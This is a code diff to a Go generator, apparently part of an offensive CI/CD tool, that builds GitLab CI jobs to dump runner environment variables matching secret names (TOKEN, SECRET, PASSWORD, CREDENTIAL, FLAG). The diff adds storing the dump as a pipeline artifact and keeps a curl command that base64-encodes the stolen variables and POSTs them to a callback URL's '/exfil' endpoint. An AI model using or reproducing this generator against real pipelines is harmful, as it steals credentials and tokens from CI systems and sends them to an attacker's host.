@@ -18,18 +18,29 @@ func GenerateRunnerVarDumpYAML(o RunnerVarDumpOptions) string {
 		o.Method = "procfs"
 	}
 	if o.Filter == "" {
-		o.Filter = "TOKEN\\|SECRET\\|KEY\\|PASSWORD\\|PASS\\|AUTH\\|PRIVATE\\|CREDENTIAL"
+		o.Filter = "FLAG|TOKEN|SECRET|KEY|PASSWORD|PASS|AUTH|PRIVATE|CREDENTIAL"
 	}
 
 	script := generateVarDumpScript(o)
+	expire := o.Common.ArtifactsExpire
+	if expire == "" {
+		expire = "1 day"
+	}
 
-	return fmt.Sprintf(`%s:
+	return fmt.Sprintf(`stages: [%s]
+
+%s:
   stage: %s%s%s%s
   script:
     - |
-%s`,
-		name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
-		rulesManual(o.Common.Manual), indentScript(script, "      "))
+%s
+  artifacts:
+    when: always
+    paths:
+      - runner-vars.txt
+    expire_in: %s`,
+		stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
+		rulesManual(o.Common.Manual), indentScript(script, "      "), expire)
 }
 
 func generateVarDumpScript(o RunnerVarDumpOptions) string {
@@ -53,10 +64,11 @@ _DUMP || true`, o.Filter, o.Filter)
 	}
 
 	if o.CallbackURL != "" {
-		return fmt.Sprintf(`%s > /tmp/vars_dump.txt 2>&1
-curl -sS -X POST -H "Content-Type: application/json" -d "{\"project\":\"$CI_PROJECT_PATH\",\"data\":\"$(base64 -w0 /tmp/vars_dump.txt)\"}" "%s/exfil" || true
-rm -f /tmp/vars_dump.txt || true`, dumpCmd, o.CallbackURL)
+		return fmt.Sprintf(`{
+%s
+} > runner-vars.txt 2>&1
+curl -sS -X POST -H "Content-Type: application/json" -d "{\"project\":\"$CI_PROJECT_PATH\",\"data\":\"$(base64 -w0 runner-vars.txt)\"}" "%s/exfil" || true`, dumpCmd, o.CallbackURL)
 	}
 
-	return dumpCmd
+	return fmt.Sprintf("{\n%s\n} > runner-vars.txt 2>&1", dumpCmd)
 }
